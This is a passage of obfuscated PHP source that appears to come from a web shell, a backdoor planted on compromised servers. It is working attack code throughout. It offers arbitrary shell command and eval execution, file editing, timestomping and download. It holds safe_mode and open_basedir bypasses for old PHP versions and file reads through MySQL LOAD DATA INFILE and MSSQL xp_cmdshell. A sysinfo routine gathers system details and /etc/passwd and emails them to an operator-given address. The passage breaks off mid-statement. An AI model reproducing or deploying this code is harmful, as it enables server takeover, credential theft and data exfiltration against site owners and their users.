                    echo z9d(z5t(z9y("102")) . z9c(z5w('', '1') . @htmlspecialchars($encoder_output) .
                        z5q()));
                }
                echo z10q();
                echo z6s();
                z0c($d . $f);
                if (z7e('touch')) {
                    z3i();
                    echo z3q(z9y("103"));
                    echo z10w(z5b() . (@isset($tmsg) && !@empty($tmsg) ? z7u(z5t(z9x()) . z9c($tmsg)) :
                        '') . z7u(z5x(array("act", "d", "f", "ft" => "functions", "st1" => "1"), z5t(z9y
                        ("104")) . z9c(z5y("copy_from", "", "9") . z8b(z9y("112"), "7")))) . z7u(z5x(array
                        ("act", "d", "f", "ft" => "functions", "st2" => "1"), z5t(z9y("105")) . z9c(z3m
                        ("tmonth", $tmonth_arr, "4", 1) . "-" . z3m("tday", $tday_arr, "4", 1) . "-" .
                        z3m("tyear", $tyear_arr, "4", 1) . z9x(12) . z3m("thour", $thour_arr, "1", 1) .
                        ":" . z3m("tmin", $tmin_arr, "1", 1) . ":" . z3m("tsec", $tsec_arr, "1", 1) .
                        z8b(z9y("112"), "7")))) . z5b(), "2");
                }
                break;
            case 'edit':
                $msg = "";
                if (@isset($save) && $save) {
                    $msg = (z9t($d . $f, $txtedit) ? z9y("243") : z9y("450"));
                    $r = z9o($d . $f);
                }
                echo z5x(array("act" => "f", "d", "f", "ft" => "edit", "save" => "1"), z10w(z9d
                    (z6l(z5w('txtedit', '2') . @htmlspecialchars($r) . z5q() . z9z() . z5z("left",
                    "3") . z7n(z9y("115")) . '<input type="text" id="replace_a" class="' . z4m('5',
                    '4') . '">' . z9x(5) . z7n(z9y("116")) .
                    '<input type="text" id="replace_b" class="' . z4m('5', '4') . '">' . z8m(z9y("117"),
                    'fnc_replace(\'txtedit\',\'replace_a\',\'replace_b\');', "7") .
                    '<input type="reset" value="' . z9y("118") . '" class="' . z4m('7', '5') . '">' .
                    z8b(z9y("119"), "7") . z9x() . z7n($msg) . z5h())), "2"));
                echo z6s();
                break;
            case 'text':
                echo z10w(z9d(z6l('<pre>' . @htmlspecialchars($r) . '</pre>')), '2');
                break;
            case 'web':
                $url = z8u();
                $url_a = @parse_url($url);
                if (@isset($url_a["host"])) {
                    $host = $url_a["host"];
                    if (($wwwdir = z3n()) !== false) {
                        if (@strstr($d . $f, $wwwdir) !== false) {
                            $link = "http://" . $host . "/" . @substr($d . $f, @strlen($wwwdir));
                            echo z10w(z9d(z6l('<iframe border="0" class="iframe" src="' . $link . '">' . z9y
                                ("471") . '</iframe>')) . z5b(), '2');
                        }
                    }
                }
                break;
            case 'html':
                if (@isset($white) && $white) {
                    @ob_clean();
                    echo $r;
                    @exit();
                } else {
                    echo z10w(z9d(z6l('<iframe border="0" class="iframe" src="?act=f&amp;f=' . @
                        urlencode($f) . '&amp;d=' . @urlencode($d) . '&white=1&ft=html">' . z9y("471") .
                        '</iframe>')) . z5b(), '2');
                }
                break;
            case 'htmls':
                if (@isset($white) && $white) {
                    $r = @preg_replace('#\b(on(?<!\.on)[a-z]{2,20})\s*=\s*([\\\'"])?((?(2)(?(?<=")[^"]{1,1000}|[^\\\']{1,1000})|[^\s"\\\'>]{1,1000}))(?(2)\\2|)#i',
                        '', $r);
                    $r = @preg_replace('#(<script[^>]*>.*?</script>|<[/]*noscript>|<meta\s(.*?)>)#is',
                        '', $r);
                    $r = @preg_replace('#\b(href(?<!\.))\s*=\s*([\\\'"])?javascript:#i', 'href=\\2#javascript:',
                        $r);
                    @ob_clean();
                    echo $r;
                    @exit();
                } else {
                    echo z10w(z9d(z6l('<iframe border="0" class="iframe" src="?act=f&amp;f=' . @
                        urlencode($f) . '&amp;d=' . @urlencode($d) . '&white=1&ft=htmls">' . z9y("471") .
                        '</iframe>')) . z5b(), '2');
                }
                break;
            case 'code':
                echo z7w('', '2') . z7o() . z6q();
                z1p($r, $ext);
                echo z7f() . z7y() . z10q();
                break;
            case 'exe':
                if (!@isset($ecmd)) {
                    $ext = z2l($f, '.');
                    $ecmd = $d . $f;
                    foreach ($execaliases as $ek => $ev) {
                        if (@in_array(@strtolower($ext), $ev)) {
                            $ecmd = @str_replace("%f%", $ecmd, $ek);
                            break;
                        }
                    }
                }
                echo z5x(array("act" => "f", "ft" => "exe", "d", "f", "exec" => "1"), z10w(z5b() .
                    z7u(z6l(z7n(z9y("120")) . z5y('ecmd', '', "9") . z8b(z9y("99"), "7"))) . z5b(),
                    "2"));
                if (@isset($exec) && $exec && !@empty($ecmd)) {
                    echo z9m("2") . z6f() . z6q() . z5w('', "1");
                    $res = z9e($ecmd);
                    echo $res;
                    echo z5q() . z7f() . z7y() . z5b() . z10q();
                }
                break;
            case 'sess':
                echo z7w('', '2') . z7o() . z6q() . '<pre>';
                $e = @explode('|', $r);
                echo $e[0] . z9z();
                @var_dump(@unserialize($e[1]));
                echo '</pre>';
                echo '</pre>' . z7f() . z7y() . z10q();
                break;
            case 'ini':
                echo z7w('', '2') . z7o() . z6q() . '<pre>';
                @var_dump(@parse_ini_file($d . $f, true));
                echo '</pre>' . z7f() . z7y() . z10q();
                break;
            case 'sdb':
                echo z7w('', '2') . z7o() . z6q() . '<pre>';
                @var_dump(@unserialize(@base64_decode($r)));
                echo '</pre>' . z7f() . z7y() . z10q();
                break;
            case 'img':
                if (!@isset($is))
                    $is = 50;
                $inf = @getimagesize($d . $f);
                if (@isset($inf[0]) && @isset($inf[1]) && @isset($inf['mime'])) {
                    $w = $inf[0] / 100 * $is;
                    $h = $inf[1] / 100 * $is;
                    $mime = $inf["mime"];
                } else {
                    $w = $h = $t = '';
                    if (@preg_match('/(jpg|jpeg|gif|png)/i', $r, $m))
                        $t = ($m[1] === 'jpeg') ? 'jpg' : $m[1];
                    $mime = 'image/' . @strtolower($t);
                }
                if (!@isset($white) || !$white) {
                    echo z5z("center") . z9z();
                    if ($w != '') {
                        foreach (array('20', '50', '100', '150', '200') as $v)
                            echo z5x(array('act' => 'f', 'd', 'f', 'ft' => 'img', 'is' => $v), z8b($v . '%',
                                ($is == $v ? '17' : '16')));
                    }
                    echo z9z(2) . '<img alt="" src="?act=f&amp;f=' . @urlencode($f) .
                        '&amp;ft=img&amp;white=1&amp;d=' . @urlencode($d) . '"' . ($w != '' ? ' width="' .
                        $w . '"' : '') . ($h != '' ? ' height="' . $h . '"' : '') .
                        ' border="0" style="border: 1px solid #DDDDDD;">' . z5h() . z9z(2);
                } else {
                    @ob_clean();
                    @header("Content-type: " . $mime);
                    echo $r;
                    exit();
                }
                break;
            case 'hex':
                if (!@isset($hexdump_type))
                    $hexdump_type = '';
                if ($hexdump_type == "full") {
                    $str = $r;
                } else {
                    $str = @substr($r, 0, 16 * 24);
                }
                $n = 0;
                $a0 = $a1 = $a2 = '';
                $ofs = 0;
                $len = @strlen($str);
                for ($i = 0; $i < $len; $i++) {
                    $a1 .= @sprintf('%02X', @ord($str[$i])) . z9x();
                    if (@ord($str[$i]) == 0) {
                        $a2 .= z5p("0");
                    } elseif (@ord($str[$i]) >= 0x20 && @ord($str[$i]) <= 0x7E) {
                        $a2 .= @htmlspecialchars($str[$i]);
                    } else {
                        $a2 .= ".";
                    }
                    $n++;
                    if ($n == 24 || ($i + 1 == $len && !@is_int($len / 24))) {
                        $n = 0;
                        $a0 .= @sprintf('%08X', $ofs) . z9z();
                        $a1 .= z9z();
                        $a2 .= z9z();
                        $ofs += 24;
                    }
                }
                echo z10w(z9d(z6l(z10w(z7u(z9c($a0, '16') . z9c($a1, '17') . z9c($a2, '18')),
                    '8') . z10w(z9d(z6z(z5x(array('act' => 'f', 'd', 'f', 'ft', 'hexdump_type' => ($hexdump_type ==
                        'full' ? 'preview' : 'full')), z8b(($hexdump_type == 'full' ? z9y("122") : z9y("121")),
                    '7')))), '8'))), '2');
                break;
            case 'download':
                @ob_clean();
                @header("Content-type: application/octet-stream");
                @header("Content-disposition: attachment; filename=\"" . $f . "\";");
                echo $r;
                exit();
                break;
            default:
                break;
        }
    } else {
        if (!@isset($loadb))
            $loadb = 0;
        $rbut = z5x($back_form_actions, z8b(z9y("470"), "7"));
        if (@empty($f)) {
            echo z3q(z9y("469") . $fmsg . z9x(5) . $rbut);
        } else {
            switch ($ft) {
                case 'new':
                    if (!z4r($d . $f) && z4j($d) && !z0n($d)) {
                        $loadb = 1;
                    } elseif (!z4r($d . $f)) {
                        $loadb = 1;
                    } elseif (z4r($d . $f) && z4j($d . $f)) {
                        echo z3q(z9y("468", $d . $f) . z9x(5) . $rbut);
                    } elseif (z4r($f) && z4j($f)) {
                        echo z3q(z9y("468", $f) . z9x(5) . $rbut);
                    }
                    break;
                default:
                    if (z4r($d . $f) && z4j($d . $f)) {
                        echo z3q(z9y("468", $d . $f) . z9x(5) . $rbut);
                    } elseif (z4r($f) && z4j($f)) {
                        echo z3q(z9y("468", $f) . z9x(5) . $rbut);
                    } elseif (!z4r($d . $f) && z4j($d) && z0n($d) && @strpos($f, "/") === false) {
                        echo z3q(z10w(z7u(z9c(z7n(z9y("466", $d . $f)) . z5x(array("act" => "f", "d",
                                "f", "ft" => "new"), z8b(z9y("195"), "7")) . $rbut)), "2"));
                    } else {
                        $loadb = 1;
                    }
                    break;
            }
        }
        if ($loadb) {
            z0c($d . $f);
            $rf_arr = $sqlrf_arr = $wf_arr = array();
            $rf_arr["include"] = "include (safe_mode)";
            if ($bcurl && @version_compare(@phpversion(), "5.2.0") <= 0)
                $rf_arr["curl"] = "curl (open_basedir / PHP <= 4.4.2, 5.1.4)";
            if (!$win && z7e('mb_send_mail') && @version_compare(@phpversion(), "5.2.0") <=
                0)
                $rf_arr["mb_send_mail"] = "mb_send_mail (safe_mode / PHP <= 4.0-4.2.2, 5.x)";
            if (z7e('imap_open') && z7e('imap_body') && @version_compare(@phpversion(),
                "5.2.0") <= 0)
                $rf_arr["imap_body"] = "imap_body (safe_mode on PHP <= 5.1.2)";
            if (z7e('ini_restore') && @version_compare(@phpversion(), "5.2.0") <= 0)
                $rf_arr["ini_restore"] = "ini_restore (safe_mode / PHP <= 4.4.4, 5.1.6) by NST";
            if (z7e('copy') && @version_compare(@phpversion(), "5.2.0") <= 0)
                $rf_arr["zlib"] = "copy[compress.zlib://] (safe_mode / PHP <= 4.4.2, 5.1.2)";
            if ($bmysql)
                $sqlrf_arr["mysql"] = "mysql (safe_mode)";
            if ($bmssql)
                $sqlrf_arr["mssql"] = "mssql (safe_mode)";
            if (z7e('error_log') && @version_compare(@phpversion(), "5.2.2") <= 0)
                $wf_arr["error_log"] = "error_log[php://] (open_basedir / PHP <= 5.1.4, 4.4.2)";
            if (z7e('readfile') && @version_compare(@phpversion(), "5.2.2") <= 0)
                $wf_arr["readfile"] = "readfile[php://] (open_basedir / PHP <= 5.2.1, 4.4.4)";
            if (@version_compare(@phpversion(), "5.2.4") <= 0)
                $wf_arr["fopen"] = "fopen[srpath://] (open_basedir / PHP v5.2.0)";
            if (@count($rf_arr) > 0) {
                echo z3q(z9y("128"));
                echo z6s();
                echo z5x(array("act" => "f", "d", "f" => (@isset($readfile) ? $readfile : $d . $f),
                        "ft" => "functions", "submit1" => "1"), z10w(z7u(z5t(z9y("129")) . z9c(z6u("readfile",
                    (@isset($readfile) ? $readfile : $d . $f), "0", "", "9") . z3m("readfile_func",
                    $rf_arr, "5", 1) . z8b(z9y("130"), "7"))), "2"));
                if (@isset($submit1) && $submit1 && @isset($readfile) && !@empty($readfile)) {
                    echo z9m("2") . z7o() . z5t(z9x()) . z7j();
                    switch ($readfile_func) {
                        case 'include':
                            echo z5w('', '1');
                            @include ($readfile);
                            echo z5q();
                            break;
                        case 'curl':
                            echo z5w('', '1');
                            $ci = @curl_init("file://" . $readfile);
                            $cf = @curl_exec($ci);
                            echo @htmlspecialchars($cf);
                            echo z5q();
                            break;
                        case 'mb_send_mail':
                            echo z5w('', '1');
                            $temp = tempnam($d, "fname");
                            if (@file_exists($temp))
                                @unlink($temp);
                            $extra = "-C " . $readfile . " -X $temp";
                            @mb_send_mail(null, null, null, null, $extra);
                            $str = z9o($temp);
                            echo @htmlspecialchars($str);
                            echo z5q();
                            @unlink($temp);
                            break;
                        case 'imap_body':
                            echo z5w('', '1');
                            $stream = @imap_open($readfile, "", "");
                            $str = @imap_body($stream, 1);
                            echo @htmlspecialchars($str);
                            @imap_close($stream);
                            echo z5q();
                            break;
                        case 'ini_restore':
                            @ini_restore("safe_mode");
                            @ini_restore("open_basedir");
                            $str = z9o($readfile);
                            echo z5w('', '1') . @htmlspecialchars($str) . z5q();
                            break;
                        case 'zlib':
                            $str = z9u($readfile);
                            echo z5w('', '1') . @htmlspecialchars($str) . z5q();
                            break;
                    }
                    echo z7f() . z7y() . z10q();
                }
                echo z6s();
            }
            if (@count($sqlrf_arr) > 0) {
                echo z3q(z9y("131"));
                echo z6s();
                echo z5x(array("act" => "f", "d", "f" => (@isset($readfile) ? $readfile : $d . $f),
                        "ft" => "functions", "submit2" => "1"), z10w(z7u(z5t(z9y("129")) . z9c(z6u("readfile",
                    (@isset($readfile) ? $readfile : $d . $f), "0", "", "9") . z3m("sqlreadfile_func",
                    $sqlrf_arr, "5", 1) . z8b(z9y("130"), "7"))) . z7u(z5t(z9y("132")) . z9c(z5y("sqluser",
                    "root", "4", "", "9") . z9x(2) . z7n(z9y("133")) . z5y("sqlpass", "", "4") . z9x
                    (2) . z7n(z9y("134")) . z5y("sqlport", "3306", "1") . z9x(2) . z7n(z9y("135")) .
                    z5y("sqldb", "mysql", "4"))), "2"));
                if (@isset($submit2) && $submit2 && @isset($readfile) && !@empty($readfile) && @
                    isset($sqluser) && @isset($sqlpass) && @isset($sqlport) && @isset($sqldb)) {
                    echo z9m("2") . z7o() . z5t(z9x()) . z7j();
                    switch ($sqlreadfile_func) {
                        case 'mysql':
                            echo z5w('', '1');
                            if (@empty($sqlport))
                                $sqlport = "3306";
                            $db = @mysql_connect('localhost:' . $sqlport, $sqluser, $sqlpass);
                            if ($db) {
                                if (@mysql_select_db($sqldb, $db)) {
                                    @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table");
                                    @mysql_query("CREATE TABLE `temp_mysql_readfile_table` ( `file` LONGBLOB NOT NULL )");
                                    @mysql_query("LOAD DATA INFILE \"" . $readfile . "\" INTO TABLE temp_mysql_readfile_table");
                                    $r = @mysql_query("SELECT * FROM temp_mysql_readfile_table");
                                    while (($r_sql = @mysql_fetch_array($r)) !== false) {
                                        echo @htmlspecialchars($r_sql[0]) . "\r\n";
                                    }
                                    @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table");
                                } else
                                    echo z9y("136");
                                @mysql_close($db);
                            } else
                                echo z9y("137", "MySQL");
                            echo z5q();
                            break;
                        case 'mssql':
                            echo z5w('', '1');
                            if (@empty($sqlport))
                                $sqlport = "1433";
                            $db = @mssql_connect('localhost,' . $sqlport, $sqluser, $sqlpass);
                            if ($db) {
                                if (@mssql_select_db($sqldb, $db)) {
                                    @mssql_query("drop table mssql_readfile_temp_table", $db);
                                    @mssql_query("create table mssql_readfile_temp_table ( string VARCHAR (500) NULL)",
                                        $db);
                                    @mssql_query("insert into mssql_readfile_temp_table EXEC master.dbo.xp_cmdshell '" .
                                        $readfile . "'", $db);
                                    $res = @mssql_query("select * from mssql_readfile_temp_table", $db);
                                    while (($row = @mssql_fetch_row($res)) !== false) {
                                        echo @htmlspecialchars($row[0]) . "\r\n";
                                    }
                                    @mssql_query("drop table mssql_readfile_temp_table", $db);
                                } else
                                    echo z9y("136");
                                @mssql_close($db);
                            } else
                                echo z9y("137", "MsSQL");
                            echo z5q();
                            break;
                    }
                    echo z7f() . z7y() . z10q();
                }
                echo z6s();
            }
            if (@count($wf_arr) > 0) {
                echo z3q(z9y("138"));
                echo z6s();
                echo z5x(array("act" => "f", "d", "f" => (@isset($writefile) ? $writefile : $d .
                        $f), "ft" => "functions", "submit3" => "1"), z10w(z7u(z5t(z9y("139")) . z9c(z5y
                    ("writefile", $d . $f, "0", "", "9") . z3m("writefile_func", $wf_arr, "5", 1) .
                    z8b(z9y("141"), "7"))) . z7u(z5t(z9y("140")) . z9c(z5w("writecontent", "1") . (@
                    isset($writecontent) ? @htmlspecialchars($writecontent) : '<? phpinfo(); ?>') .
                    z5q())), "2"));
                if (@isset($submit3) && $submit3 && @isset($writefile) && !@empty($writefile)) {
                    echo z9m("2") . z6f() . z5t(z9x()) . z7j();
                    switch ($writefile_func) {
                        case 'error_log':
                            @error_log($writecontent, 3, "php://../../../../../../../../../../../" . $writefile);
                            if (z4r($writefile))
                                echo z9y("243");
                            break;
                        case 'readfile':
                            @readfile($writecontent, 3, "php://../../../../../../../../../../../" . $writefile);
                            if (z4r($writefile))
                                echo z9y("243");
                            break;
                            break;
                        case 'fopen':
                            if ($fp = @fopen('srpath://../../../../../../../../../../../' . $writefile, "a")) {
                                @fputs($fp, $writecontent);
                                @fclose($fp);
                                echo z9y("243");
                            }
                            break;
                        default:
                            break;
                    }
                    echo z7f() . z7y() . z10q();
                }
                echo z6s();
            }
        }
    }
}
if ($act == 'search') {
    $ftarget = 1;
    $fullpath = 1;
    if (!@isset($s_in) || @empty($s_in))
        $s_in = $d;
    if (!@isset($sn) || @empty($sn)) {
        $sn = "(.*)";
        $sn_reg = 1;
    }
    if (!@isset($sn_reg))
        $sn_reg = '';
    if (!@isset($st))
        $st = '';
    if (!@isset($st_reg))
        $st_reg = '';
    if (!@isset($st_wwo))
        $st_wwo = '';
    if (!@isset($st_cs))
        $st_cs = '';
    if (!@isset($st_not))
        $st_not = '';
    if (!@isset($s_fd))
        $s_fd = '';
    if (!@isset($s_rec))
        $s_rec = '1';
    if (!@isset($find_text) || @empty($find_text))
        $find_text = "text";
    if (!@isset($find_in_dir) || @empty($find_in_dir))
        $find_in_dir = $d;
    if (!@isset($find_in_files) || @empty($find_in_files))
        $find_in_files = "*.php;*.txt";
    z0h();
    if (@isset($submit) && $submit) {
        $found = array();
        $found_d = 0;
        $found_f = 0;
        $search_i_f = 0;
        $search_i_d = 0;
        $ar = array("sn" => $sn, "sn_reg" => $sn_reg, "st" => $st, "st_reg" => $st_reg,
                "st_wwo" => $st_wwo, "st_cs" => $st_cs, "st_not" => $st_not, "s_fd" => $s_fd);
        $in = @array_unique(@explode(";", $s_in));
        foreach ($in as $v) {
            $sdir = $v;
            z5d($v);
        }
        if (@count($found) == 0) {
            echo z3q(z9y("160"));
        } else {
            $nolsmenu = 1;
            $nohead = 1;
            $ls_a = $found;
            $act = "ls";
        }
    }
}
if ($act == 'cmd') {
    $st_a = array('' => '-', ' 2>&1' => '2>&1');
    echo z3q(z10w(z7u(z6l(z7n(z9y("180")) . z9k('', 'command') . z2x(array('act' =>
            'cmd', 'd', 'cmdsubmit' => '1')) . z6u('cmd', '', '0') . ($nix ? z3m('stderr', $st_a,
        '1', '1') : '') . z8b('&raquo;', '7') . z9l(), '', '2') . z6l(z7n(z9y("181")) .
        z5x(array('act' => 'cmd', 'd', 'cmdsubmit' => '1'), z2k('scmd', ($win ? $winaliases :
        $nixaliases), '0', '1') . ($nix ? z3m('stderr', $st_a, '1', '1') : '') . z8b('&raquo;',
        '7')), '')), '2'));
    echo z9m('2') . z6f() . z6q() . z5w('', '0', 1);
    if (@isset($cmdsubmit) && $cmdsubmit) {
        echo z9e((@isset($cmd) ? (@isset($stderr) ? $cmd . $stderr : $cmd) : (@isset($stderr) ?
            $scmd . $stderr : $scmd)));
    }
    echo z5q() . z7f() . z7y() . z10q();
}
if ($act == 'phpinfo') {
    $piarr = z1w(1);
    $h = 0;
    foreach ($piarr as $k => $v) {
        echo z3q(@strtoupper($k));
        echo z9m('2');
        $i = 0;
        foreach ($v as $a => $b) {
            if (@is_string($b)) {
                echo z9d(z9c($a, '14', '25') . z9c($b, '14'), ($i % 2 ? '0' : '1'));
                $i++;
            }
        }
        $h++;
        echo z10q();
    }
}
if ($act == 'sysinfo') {
    $g_arr = array();
    $date = @date("D M j G:i:s T Y");
    $users = array();
    if ($bpasswd)
        $users = z8l(1);
    $distro = z1b();
    $uptime = ($nix && $sh_exec) ? z9e("uptime") : '';
    $system = $host = $kernel = "";
    $sys = (($nix && $sh_exec) ? z9e("uname -a") : (z7e('php_uname') ? @php_uname("a") :
        '   '));
    if ($nix)
        @list($system, $host, $kernel, ) = @explode(" ", $sys);
    if (!@empty($sys))
        $g_arr[] = array("System", $sys, $sys);
    if (!@empty($system) && !@empty($kernel))
        $g_arr[] = array((($linux) ? "Kernel" : "Version"), $system . " " . $kernel, $system .
                " " . $kernel);
    if (!@empty($distro))
        $g_arr[] = array("Distro name", $distro, nl2br($distro));
    $idu = "";
    if ($nix && $sh_exec) {
        $idu = z9e("id");
        $eid = @explode(" ", $idu);
        if (@count($eid) >= 2)
            $idu = $eid[0] . " " . $eid[1];
    }
    if (!@empty($idu))
        $g_arr[] = array("User id", $idu, $idu);
    if (!@empty($uptime))
        $g_arr[] = array("Uptime", $uptime, $uptime);
    if (!@empty($date))
        $g_arr[] = array("Local time", $date, $date);
    $g_arr[] = array("CPU info", z3o(), z3o());
    $mem = z5a();
    $g_arr[] = array("RAM info", $mem[0][1], $mem[0][0] . $mem[0][1]);
    if ($nix)
        $g_arr[] = array("RAM buffered", $mem[1][1], $mem[1][0] . $mem[1][1]);
    if ($nix)
        $g_arr[] = array("Swap", $mem[2][1], $mem[2][0] . $mem[2][1]);
    $disk = z9r();
    if (@count($disk) > 1 || !@isset($disk[0][0])) {
        foreach ($disk as $dd => $inf) {
            $g_arr[] = array("Space on " . $dd, $inf[1], $inf[0] . $inf[1]);
        }
    } else {
        $g_arr[] = array("Disk space", $disk[0][1], $disk[0][0] . $disk[0][1]);
    }
    if (!@empty($host)) {
        $host .= " (" . @gethostbyname($host) . ") ";
    }
    if (@preg_match('/^\d\.\d\.\d\.\d$/', $saddr)) {
        $host .= $saddr;
    } else {
        $host .= $saddr . " (" . @gethostbyname($saddr) . ")";
    }
    $g_arr[] = array("Hostname", $host, $host);
    if (@count($users) > 0) {
        if (@isset($viewusers) && $viewusers) {
            $pusers = '';
            foreach ($users as $uarr) {
                $pusers .= z5x(array("act" => "ls", "d" => $uarr[1]), z8b($uarr[0], "1"), 1) .
                    z9x() . " ";
            }
        } else {
            $pusers = @count($users) . " users on this box." . z9x() . z5x(array("act" =>
                    "sysinfo", "d", "viewusers" => "1"), z8b("View", "1"));
        }
        $g_arr[] = array("System users", "", $pusers);
    }
    if (@count($g_arr) > 0) {
        echo z3q(z9y("479"));
        echo z9m('2');
        for ($i = 0; $i < @count($g_arr); $i++) {
            echo z9d(z9c($g_arr[$i][0], "14", "25") . z9c($g_arr[$i][2], "14", "3"), ($i % 2 ?
                '0' : '1'));
        }
        echo z10q();
    }
    $bsmed = z8d("safe_mode_exec_dir");
    $psmed = (($bsmed) ? @ini_get("safe_mode_exec_dir") : "NONE");
    $bsmid = z8d("safe_mode_include_dir");
    $psmid = (($bsmid) ? @ini_get("safe_mode_include_dir") : "NONE");
    $opendirs = "";
    if ($bopendir) {
        foreach (z9a(@ini_get("open_basedir")) as $od) {
            $opendirs .= z5x(array("act" => "ls", "d" => $od), z8b($od, "1"), 1) . z9x() .
                " ";
        }
    }
    $dfnc = z6h();
    if (@count($dfnc) > 0) {
        $ndfnc = @implode(" ", $dfnc);
        $pdfnc = "";
        foreach ($dfnc as $fnc)
            $pdfnc .= z10t('http://php.net/manual/en/function.' . @str_replace("_", "-", $fnc) .
                '.php', $fnc, "1", 1) . z9x() . " ";
    } else {
        $ndfnc = "NONE";
        $pdfnc = z5p("NONE");
    }
    $p_arr = array();
    $p_arr[] = array("PHP Version", @phpversion(), @phpversion() . z9x() . z5x(array
            ("act" => "phpinfo", "d"), z8b("PHP Info", "1")));
    $p_arr[] = array("Open Basedir", (($bopendir) ? @ini_get("open_basedir") :
            "NONE"), (($bopendir) ? $opendirs : z5p("NONE")));
    $p_arr[] = array("Safe-mode", (($bsafe) ? "ON" : "OFF"), ($bsafe ? z8k("ON") :
            z5p("OFF")));
    if ($bsafe) {
        $p_arr[] = array("Safe-mode exec dir", $psmed, (($bsmed) ? z5p($psmed) : z8k($psmed)));
        $p_arr[] = array("Safe-mode include dir", $psmid, (($bsmid) ? z5p($psmid) : z8k
                ($psmid)));
    }
    foreach (array("register_globals", "allow_url_fopen", "allow_url_include",
            "memory_limit", "file_uploads", "upload_tmp_dir", "upload_max_filesize",
            "post_max_size", "magic_quotes_gpc") as $ini) {
        $p_arr[] = array(z3r(@str_replace("_", " ", $ini)), z3x(@ini_get($ini)), z3x(@
                ini_get($ini)));
    }
    $p_arr[] = array("Disabled Functions", $ndfnc, $pdfnc);
    if (@count($p_arr) > 0) {
        echo z3q(z9y("480"));
        echo z9m('2');
        for ($i = 0; $i < @count($p_arr); $i++) {
            echo z9d(z9c($p_arr[$i][0], "14", "25") . z9c($p_arr[$i][2], "14", "3"), ($i % 2 ?
                '0' : '1'));
        }
        echo z10q();
    }
    if ($nix) {
        $o_arr = array();
        $tmp = $tmpp = '';
        foreach (array("/etc/" => array("passwd", "hosts", "modules", "fstab", "issue",
                    "issue.net", "motd"), "/proc/" => array("cpuinfo", "meminfo", "version",
                    "interrupts")) as $ed => $af) {
            foreach ($af as $ef) {
                if (z4r($ed . $ef) && z1y($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5x(array("act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"), z8b($ef,
                        "1"), 1) . z9x() . " ";
                }
            }
        }
        if (!@empty($tmp))
            $o_arr[] = array(z9y("482"), $tmp, $tmpp);
        $tmp = $tmpp = '';
        foreach (array("/etc/" => array("syslog.conf", "syslogd.conf", "rsyslog.conf",
                    "resolv.conf", "httpd.conf", "apache2.conf", "apache.conf",
                    "apache2/apache.conf", "proftpd.conf", "proftpd.conf", "inetd.conf"),
                "/etc/apache2/" => array("httpd.conf", "apache2.conf"), "/etc/proftpd/" => array
                ("proftpd.conf")) as $ed => $af) {
            foreach ($af as $ef) {
                if (z4r($ed . $ef) && z1y($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5x(array("act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"), z8b($ef,
                        "1"), 1) . z9x() . " ";
                }
            }
        }
        if (!@empty($tmp))
            $o_arr[] = array(z9y("483"), $tmp, $tmpp);
        $tmp = $tmpp = '';
        foreach (array("curl", "fetch", "links", "lynx", "GET", "w3m", "wget") as $ef) {
            $ff = z8t($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5x(array("act" => "f", "d" => z3a($ff), "f" => z2l($ff)), z8b(z2l($ef),
                    "1"), 1) . z9x() . " ";
            }
        }
        $tmp = $tmpp = '';
        foreach (array("gcc", "cc", "c++", "g++", "nasm", "ld", "make", "cmake") as $ef) {
            $ff = z8t($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5x(array("act" => "f", "d" => z3a($ff), "f" => z2l($ff)), z8b(z2l($ef),
                    "1"), 1) . z9x() . " ";
            }
        }
        if (!@empty($tmp))
            $o_arr[] = array(z9y("484"), $tmp, $tmpp);
        $tmp = $tmpp = '';
        foreach (array("perl", "python", "php", "ruby", "tcl") as $ef) {
            $ff = z8t($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5x(array("act" => "f", "d" => z3a($ff), "f" => z2l($ff)), z8b(z2l($ef),
                    "1"), 1) . z9x() . " ";
            }
        }
        if (!@empty($tmp))
            $o_arr[] = array(z9y("485"), $tmp, $tmpp);
        if (@count($o_arr) > 0) {
            echo z3q(z9y("481"));
            echo z9m('2');
            for ($i = 0; $i < @count($o_arr); $i++) {
                echo z9d(z9c($o_arr[$i][0], "14", "25") . z9c($o_arr[$i][2], "14", "3"), ($i % 2 ?
                    '0' : '1'));
            }
            echo z10q();
        }
    }
    if ($bmail) {
        $emsg = '';
        $msg = '';
        if (@isset($sendlog) && $sendlog && @isset($sysmail) && !@empty($sysmail)) {
            $line = @str_repeat("-", 100) . "\r\n";
            if (@count($g_arr) > 0) {
                $msg .= $line . z9y("479") . "\r\n" . $line;
                for ($i = 0; $i < @count($g_arr); $i++) {
                    if (!@empty($g_arr[$i][1]))
                        $msg .= $g_arr[$i][0] . " : " . $g_arr[$i][1] . "\r\n";
                }
            }
            if (@count($p_arr) > 0) {
                $msg .= $line . z9y("480") . "\n" . $line;
                for ($i = 0; $i < @count($p_arr); $i++) {
                    if (!@empty($p_arr[$i][1]))
                        $msg .= $p_arr[$i][0] . " : " . $p_arr[$i][1] . "\r\n";
                }
            }
            if (@count($o_arr) > 0) {
                $msg .= $line . z9y("481") . "\n" . $line;
                for ($i = 0; $i < @count($o_arr); $i++) {
                    if (!@empty($o_arr[$i][1]))
                        $msg .= $o_arr[$i][0] . " : " . $o_arr[$i][1] . "\r\n";
                }
            }
            $msg .= $line;
            if ($bpasswd)
                $msg .= "/etc/passwd\n" . $line . z9o("/etc/passwd") . $line;
            $emsg = (@mail($sysmail, "SYSINFO|$saddr", $msg) ? z9y("243") : z9y("244"));
        }
        echo z3q(z9y("302") . (($emsg != '') ? " : " . $emsg : ''));
        echo z5x(array("act" => "sysinfo", "d", "sendlog" => "1"), z10w(z5b() . z7u(z6l
            (z5y("sysmail", z7z('2', "email"), "0") . z8b(z9y("179"), "7"))) . z5b(), "2"));
    }
}
if ($act == 'eval') {
    if (!@isset($evalsubmit)) {
        $eval_txt = 1;
    } elseif (!@isset($eval_txt)) {
        $eval_txt = 0;
    }
    echo z3q(z9y("182")) . z6s();
    echo z10w(z7u(z6l(z5x(array('act' => 'eval', 'd', 'evalsubmit' => '1'), z5w('eval',
        '1') . (@isset($eval) ? @htmlspecialchars($eval) : '//readfile("/etc/passwd");' .
